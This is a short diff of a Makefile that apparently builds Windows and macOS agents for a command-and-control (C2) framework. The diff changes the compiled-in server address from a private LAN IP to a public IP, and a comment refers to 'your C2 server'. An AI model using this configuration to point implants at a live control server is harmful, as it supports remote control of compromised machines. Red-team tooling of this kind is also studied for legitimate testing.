@@ -8,7 +8,7 @@ AGENT_WINDOWS=windows-agent.exe
 AGENT_MACOS=macos-agent
 
 # Set server IP for agents during compilation - change this to your C2 server's IP
-SERVER_IP=192.168.2.124
+SERVER_IP=64.23.212.29
 
 all: clean build
 
